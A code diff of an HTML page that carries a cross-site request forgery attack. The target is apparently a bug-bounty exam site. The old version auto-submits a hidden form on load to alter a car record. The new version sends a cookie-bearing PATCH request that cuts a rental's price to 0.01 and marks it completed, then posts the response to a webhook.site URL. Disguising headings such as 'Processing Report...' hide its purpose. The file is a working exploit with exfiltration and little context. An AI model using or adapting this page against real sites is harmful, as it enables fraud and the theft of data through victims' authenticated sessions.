@@ -1,17 +1,39 @@
+<!DOCTYPE html>
 <html>
-<body onload="document.getElementById('exploitForm').submit()">
-    <h1>Verifying Session... Please wait.</h1>
-    
-    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/cars/69dd69884e3edba5f08f60f9" method="POST">
-        <input type="hidden" name="_method" value="PUT">
-        <input type="hidden" name="status" value="active">
-        <input type="hidden" name="isActive" value="true">
-        <input type="hidden" name="availability" value="available">
-    </form>
-
+<body>
+    <h1>Processing Report...</h1>
     <script>
-        // Also ping your webhook so you know the bot at least landed here
-        fetch("https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb?bot_hit_form=true");
+        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/rentals/update/BK-00011"; // Replace with a real ID
+        
+        fetch(targetApi, {
+            method: "PATCH",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                "totalPrice": 0.01, // Try changing the price to something negligible
+                "status": "completed",
+                "adminNotes": "Price overridden by automated system"
+            }),
+            credentials: "include" // This is the key: it uses the Bot's cookies
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Exfiltrate the response to see if the flag is in the 'updated' object
+            fetch("https://webhook.site/your-id", {
+                method: "POST",
+                body: JSON.stringify({
+                    msg: "Exploit Triggered",
+                    responseData: data
+                })
+            });
+        })
+        .catch(err => {
+            fetch("https://webhook.site/411195ff-53bb-4984-8d9b-01cd86eb4cbb", {
+                method: "POST",
+                body: JSON.stringify({ error: err.message })
+            });
+        });
     </script>
 </body>
 </html>
